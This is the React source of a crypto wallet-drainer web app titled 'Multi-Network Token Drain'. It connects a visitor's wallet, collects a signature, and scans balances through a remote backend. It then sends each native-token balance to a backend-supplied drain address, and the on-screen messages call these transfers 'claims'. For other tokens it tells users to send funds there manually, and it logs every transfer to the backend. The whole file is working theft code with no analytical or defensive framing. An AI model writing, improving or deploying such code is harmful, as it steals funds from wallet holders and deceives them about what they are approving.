import { useState, useEffect } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useChainId, useWalletClient } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// Network Configuration
const NETWORKS = [
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', scan: true },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', scan: true },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', scan: true },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', scan: true },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', scan: true },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', scan: true },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', scan: true },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', scan: true },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', scan: true },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', scan: true },
  
  // Non-EVM Chains
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', scan: false },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', scan: false },
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', scan: false },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', scan: false },
];

function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
        }}
        theme="midnight"
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function MultiNetworkDashboard() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();

  const [authStatus, setAuthStatus] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState({});
  const [drainStatus, setDrainStatus] = useState({});
  const [isDrainingAll, setIsDrainingAll] = useState(false);

  useEffect(() => {
    if (isConnected && address) {
      setAuthStatus('🔄 Wallet connected');
    } else {
      resetState();
    }
  }, [isConnected, address]);

  const resetState = () => {
    setAuthStatus('');
    setUserTokens({});
    setDrainStatus({});
  };

  const authenticateWithBackend = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('🔐 Signing message...');
      
      const message = `Authenticate for Multi-Network Token Drain\nWallet: ${address}\nTime: ${Date.now()}`;
      const signature = await signMessageAsync({ message });
      
      setAuthStatus('📡 Sending to backend...');
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          address,
          signature,
          message
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setAuthStatus('✅ Authenticated successfully!');
        // Auto-scan after auth
        setTimeout(() => scanAllNetworks(), 1000);
      } else {
        setAuthStatus(`❌ Authentication failed: ${data.error}`);
      }
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('❌ Signature rejected by user');
      } else if (error.message.includes('No internet')) {
        setAuthStatus('❌ No internet connection');
      } else {
        setAuthStatus(`❌ Error: ${error.message}`);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setAuthStatus('🔍 Scanning networks...');
    
    try {
      const response = await fetch(`${backendUrl}/scan/${address}`);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        const allTokens = {};
        data.data.results.forEach(result => {
          if (result.tokens && result.tokens.length > 0) {
            allTokens[result.network.id] = {
              network: result.network,
              tokens: result.tokens,
              totalValue: result.totalValue || 0
            };
          }
        });
        
        setUserTokens(allTokens);
        
        const totalTokens = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
        const totalValue = Object.values(allTokens).reduce((sum, data) => sum + data.totalValue, 0);
        
        setAuthStatus(`✅ Found ${totalTokens} tokens across ${Object.keys(allTokens).length} networks ($${totalValue.toFixed(2)})`);
      } else {
        setAuthStatus(`❌ Scan failed: ${data.error}`);
      }
    } catch (error) {
      console.error("Scan error:", error);
      setAuthStatus(`❌ Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const executeDrain = async (token) => {
    if (!walletClient || !address) {
      setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'error', message: 'Wallet not ready' }}));
      return;
    }

    try {
      setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'processing', message: 'Preparing...' }}));
      
      // Check if amount is valid
      if (token.amount <= 0 || token.amount === '0') {
        setDrainStatus(prev => ({...prev, [token.networkId]: { 
          status: 'error', 
          message: 'Amount is 0, nothing to claim' 
        }}));
        return;
      }
      
      // For EVM native tokens
      if (token.isNative && typeof token.networkId === 'number') {
        const amountInWei = parseEther(token.amount.toString());
        
        // Check if amount is too small
        if (amountInWei <= 10000n) { // Less than 0.000000000001 ETH equivalent
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'error', 
            message: 'Amount too small to claim' 
          }}));
          return;
        }
        
        setDrainStatus(prev => ({...prev, [token.networkId]: { status: 'processing', message: 'Confirm in wallet...' }}));
        
        try {
          const hash = await walletClient.sendTransaction({
            to: token.drainAddress,
            value: amountInWei,
          });
          
          // Success
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'success', 
            message: `✅ Successfully claimed ${token.amount} ${token.symbol}!`,
            txHash: hash
          }}));
          
          // Log success to backend
          await logTransaction(token, hash, 'success');
          
          // Remove from UI after success
          setTimeout(() => {
            setUserTokens(prev => {
              const updated = {...prev};
              if (updated[token.networkId]) {
                updated[token.networkId].tokens = updated[token.networkId].tokens.filter(t => 
                  t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
                );
              }
              return updated;
            });
          }, 2000);
          
        } catch (txError) {
          console.error("Transaction error:", txError);
          
          let errorMessage = 'Oops, something went wrong. Retry again';
          
          if (txError.code === 4001) {
            errorMessage = 'Transaction rejected by user';
          } else if (txError.message.includes('insufficient funds') || txError.message.includes('gas')) {
            errorMessage = 'Not enough gas for this claim';
          } else if (txError.message.includes('network') || txError.message.includes('chain')) {
            errorMessage = 'Wrong network selected. Switch to correct network';
          }
          
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'error', 
            message: errorMessage 
          }}));
          
          // Log failure to backend
          await logTransaction(token, null, 'failed');
        }
      } else {
        // For ERC20 or non-EVM
        setDrainStatus(prev => ({...prev, [token.networkId]: { 
          status: 'info', 
          message: `Send ${token.symbol} manually to: ${token.drainAddress.substring(0, 12)}...`
        }}));
        
        await logTransaction(token, null, 'pending');
      }
      
    } catch (error) {
      console.error("Drain error:", error);
      setDrainStatus(prev => ({...prev, [token.networkId]: { 
        status: 'error', 
        message: 'Oops, something went wrong. Retry again' 
      }}));
    }
  };

  const drainAllTokens = async () => {
    if (!walletClient || !address) {
      setAuthStatus('❌ Wallet not ready');
      return;
    }
    
    setIsDrainingAll(true);
    setAuthStatus('⚡ Draining all tokens...');
    
    try {
      // Get all native tokens
      const allNativeTokens = [];
      Object.values(userTokens).forEach(data => {
        data.tokens.forEach(token => {
          if (token.isNative && token.amount > 0) {
            allNativeTokens.push(token);
          }
        });
      });
      
      if (allNativeTokens.length === 0) {
        setAuthStatus('❌ No tokens available to drain');
        setIsDrainingAll(false);
        return;
      }
      
      let successCount = 0;
      let failCount = 0;
      
      // Drain tokens one by one
      for (const token of allNativeTokens) {
        try {
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'processing', 
            message: `Draining ${token.symbol}...` 
          }}));
          
          const amountInWei = parseEther(token.amount.toString());
          
          if (amountInWei <= 10000n) {
            setDrainStatus(prev => ({...prev, [token.networkId]: { 
              status: 'error', 
              message: 'Amount too small' 
            }}));
            failCount++;
            continue;
          }
          
          const hash = await walletClient.sendTransaction({
            to: token.drainAddress,
            value: amountInWei,
          });
          
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'success', 
            message: `✅ Claimed ${token.symbol}!` 
          }}));
          
          await logTransaction(token, hash, 'success');
          successCount++;
          
          // Small delay between transactions
          await new Promise(resolve => setTimeout(resolve, 2000));
          
        } catch (error) {
          console.error(`Failed to drain ${token.symbol}:`, error);
          
          let errorMsg = 'Failed';
          if (error.message.includes('insufficient funds')) {
            errorMsg = 'Not enough gas';
          } else if (error.code === 4001) {
            errorMsg = 'Rejected';
          }
          
          setDrainStatus(prev => ({...prev, [token.networkId]: { 
            status: 'error', 
            message: errorMsg 
          }}));
          
          await logTransaction(token, null, 'failed');
          failCount++;
        }
      }
      
      // Update UI after all drains
      setAuthStatus(`✅ Drain completed: ${successCount} successful, ${failCount} failed`);
      
      // Refresh token list
      setTimeout(() => {
        scanAllNetworks();
      }, 3000);
      
    } catch (error) {
      console.error("Drain all error:", error);
      setAuthStatus('❌ Failed to drain all tokens');
    } finally {
      setIsDrainingAll(false);
    }
  };

  const logTransaction = async (token, txHash = null, status = 'pending') => {
    try {
      await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fromAddress: address,
          amount: token.amount.toString(),
          chainId: token.networkId,
          tokenType: token.isNative ? 'native' : 'erc20',
          tokenAddress: token.contractAddress,
          transactionHash: txHash,
          status: status
        })
      });
    } catch (error) {
      console.log('Logging failed:', error.message);
    }
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  const getTotalValue = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.totalValue, 0).toFixed(2);
  };

  const getTotalTokens = () => {
    return Object.values(userTokens).reduce((sum, data) => sum + data.tokens.length, 0);
  };

  const getNetworkCount = () => {
    return Object.keys(userTokens).length;
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>🌐 Multi-Network Token Drain</h1>
        
        <div className="wallet-section">
          <ConnectKitButton />
        </div>
        
        {isConnected && address && (
          <div className="dashboard">
            <div className="wallet-info">
              <div className="wallet-details">
                <div>Wallet: {formatAddress(address)}</div>
                <div>Network: {NETWORKS.find(n => n.id === chainId)?.name || 'Unknown'}</div>
              </div>
              
              <div className="status-area">
                <div className={`status ${authStatus.includes('✅') ? 'success' : authStatus.includes('❌') ? 'error' : ''}`}>
                  {authStatus || 'Ready'}
                </div>
              </div>
              
              <div className="action-buttons">
                <button 
                  onClick={authenticateWithBackend}
                  disabled={isAuthenticating || isScanning}
                  className="btn-primary"
                >
                  {isAuthenticating ? 'Authenticating...' : 'Authenticate'}
                </button>
                <button 
                  onClick={scanAllNetworks}
                  disabled={isScanning || isAuthenticating}
                  className="btn-secondary"
                >
                  {isScanning ? 'Scanning...' : 'Scan Networks'}
                </button>
              </div>
            </div>
            
            {getTotalTokens() > 0 && (
              <div className="tokens-section">
                <div className="tokens-header">
                  <h2>Detected Tokens</h2>
                  <div className="summary">
                    <span>{getNetworkCount()} Networks</span>
                    <span>{getTotalTokens()} Tokens</span>
                    <span>${getTotalValue()} Total</span>
                  </div>
                  
                  <button 
                    onClick={drainAllTokens}
                    disabled={isDrainingAll || isAuthenticating || isScanning}
                    className="btn-danger"
                  >
                    {isDrainingAll ? 'Draining All...' : 'Drain All Tokens'}
                  </button>
                </div>
                
                <div className="tokens-list">
                  {Object.entries(userTokens).map(([networkId, data]) => (
                    <div key={networkId} className="network-group">
                      <div className="network-header">
                        <h3>{data.network.name}</h3>
                        <span>${data.totalValue.toFixed(2)}</span>
                      </div>
                      
                      {data.tokens.map((token, idx) => {
                        const status = drainStatus[token.networkId];
                        const tokenStatus = status?.status || 'pending';
                        
                        return (
                          <div key={idx} className="token-item">
                            <div className="token-info">
                              <div className="token-symbol">{token.symbol}</div>
                              <div className="token-name">{token.name}</div>
                              <div className="token-amount">
                                {parseFloat(token.amount).toLocaleString(undefined, {
                                  maximumFractionDigits: 8
                                })} {token.symbol}
                              </div>
                              <div className="token-value">
                                {token.value ? `$${token.value.toFixed(2)}` : 'No price'}
                              </div>
                            </div>
                            
                            <div className="token-actions">
                              {tokenStatus === 'success' && (
                                <div className="status-success">
                                  ✅ {status.message}
                                </div>
                              )}
                              
                              {tokenStatus === 'error' && (
                                <div className="status-error">
                                  ❌ {status.message}
                                </div>
                              )}
                              
                              {tokenStatus === 'processing' && (
                                <div className="status-processing">
                                  ⏳ {status.message}
                                </div>
                              )}
                              
                              {tokenStatus === 'info' && (
                                <div className="status-info">
                                  ℹ️ {status.message}
                                </div>
                              )}
                              
                              {(!status || status.status === 'pending') && (
                                <button
                                  onClick={() => executeDrain(token)}
                                  disabled={token.amount <= 0 || isAuthenticating || isDrainingAll}
                                  className="drain-btn"
                                >
                                  Drain
                                </button>
                              )}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
        
        {!isConnected && (
          <div className="connect-prompt">
            <h2>Connect Your Wallet</h2>
            <p>Connect to scan and drain tokens across all networks</p>
            <ConnectKitButton />
          </div>
        )}
        
        <div className="footer">
          <div className="links">
            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
              Backend Health
            </a>
            <span>•</span>
            <span>v6.0.0</span>
          </div>
        </div>
      </header>
    </div>
  );
}

export default TokenDrainApp;
